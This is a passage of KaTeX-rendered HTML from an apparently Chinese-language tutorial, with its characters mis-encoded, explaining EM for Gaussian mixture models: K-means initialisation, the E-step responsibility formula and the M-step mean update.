style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>ï¼Œå…¶æƒé‡ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Ï€</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\pi_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">\mathbf{x}^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"/><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span>åˆ™è¡¨ç¤ºæ•°æ®é›†ä¸­çš„ç¬¬<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>ä¸ªæ ·æœ¬ï¼Œå½¢çŠ¶ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>ã€‚</p>
<p><strong>1. å‚æ•°åˆå§‹åŒ–</strong></p>
<p>é¦–å…ˆéœ€è¦åˆå§‹åŒ– <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> ä¸ªé«˜æ–¯åˆ†å¸ƒçš„å‚æ•°ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">Î£</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>Ï€</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\Sigma_{j},\boldsymbol{\mu}_{j},\pi_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0636em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> ã€‚<strong>å®Œå…¨éšæœºåˆå§‹åŒ–</strong>è™½ç„¶ç†è®ºä¸Šå¯è¡Œï¼Œä½†å®è·µä¸­å®¹æ˜“å¯¼è‡´æ”¶æ•›ç¼“æ…¢æˆ–é™·å…¥è¾ƒå·®çš„å±€éƒ¨æœ€ä¼˜ã€‚å› æ­¤ï¼Œé€šå¸¸é‡‡ç”¨<strong>K-meansèšç±»</strong>çš„ç»“æœè¿›è¡Œåˆå§‹åŒ–ï¼š</p>
<ul>
<li>ç”¨K-meanså°†æ•°æ®åˆ’åˆ†ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> ä¸ªç°‡</li>
<li>ä»¥æ¯ä¸ªç°‡çš„æ ·æœ¬å‡å€¼ä½œä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8247em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span></span></span></span></span> çš„åˆå§‹å€¼</li>
<li>ä»¥æ¯ä¸ªç°‡çš„æ ·æœ¬åæ–¹å·®ä½œä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">Î£</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\Sigma_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> çš„åˆå§‹å€¼</li>
<li>ä»¥æ¯ä¸ªç°‡çš„æ ·æœ¬æ¯”ä¾‹ä½œä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Ï€</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\pi_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> çš„åˆå§‹å€¼</li>
</ul>
<p><strong>2. Eæ­¥ï¼šè®¡ç®—éš¶å±åº¦</strong></p>
<p>ç„¶åæ±‚å‡ºæ¯ä¸€ä¸ªæ ·æœ¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">\mathbf{x}^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"/><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span> å¯¹åº”çš„æ¯ä¸€ä¸ªé«˜æ–¯åˆ†å¸ƒ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> çš„éš¶å±åº¦ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>Î³</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">\gamma_{j}^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4578em;vertical-align:-0.413em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span></span></span>ï¼ˆæ ‡é‡ï¼‰ï¼Œå³ç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> ä¸ªæ•°æ®å±äºç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> ä¸ªé«˜æ–¯åˆ†å¸ƒçš„ç¨‹åº¦ï¼Œè®¡ç®—æ–¹å¼å¦‚ä¸‹</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>Î³</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo>=</mo><mfrac><mrow><msub><mi>Ï€</mi><mi>j</mi></msub><mtext>Â </mtext><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>âˆ£</mo><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Î£</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>âˆ‘</mo><mrow><mi>l</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup></mstyle><msub><mi>Ï€</mi><mi>l</mi></msub><mtext>Â </mtext><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>âˆ£</mo><msub><mi mathvariant="bold-italic">Î¼</mi><mi>l</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Î£</mi><mi>l</mi></msub><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\gamma_{j}^{(i)} = \frac{\pi_{j} \space \mathcal{N}(\mathbf{x}^{(i)}\mid \boldsymbol{\mu}_{j},\Sigma_{j})}{ {\textstyle \sum_{l=1}^{k}} \pi_{l} \space \mathcal{N}(\mathbf{x}^{(i)}\mid \boldsymbol{\mu}_{l},\Sigma_{l})}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4578em;vertical-align:-0.413em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.837em;vertical-align:-1.1787em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6582em;"><span style="top:-2.121em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace">Â </span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.814em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.242em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.7702em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace">Â </span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.1787em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p><strong>3. Mæ­¥ï¼šæ›´æ–°å‚æ•°</strong></p>
<p>åŸºäºEæ­¥è®¡ç®—å‡ºçš„è´£ä»»ï¼Œæˆ‘ä»¬æ›´æ–°æ¯ä¸ªé«˜æ–¯æˆåˆ†çš„å‚æ•°</p>
<ul>
<li><strong>æ›´æ–°å‡å€¼</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8247em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span></span></span></span></span>ï¼ˆå‘é‡ï¼‰ï¼š</li>
</ul>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold-italic">Î¼</mi><mi>j</mi></msub><mo>=</mo><mfrac><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup></mstyle><msubsup><mi>Î³</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></mrow><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup></mstyle><msubsup><mi>Î³</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow></mfrac></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}_{j} = \frac{{\textstyle \sum_{i=1}^{m}} \gamma_{j}^{(i)}\mathbf{x}^{(i)}}{ {\textstyle \sum_{i=1}^{m}} \gamma_{j}^{(i)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8247em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.1955em;vertical-align:-1.3478em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8478em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span><span style="top:-3.2748em;"><span class="pstrut" style="height:3.0448em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.8478em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="msupsub"><span 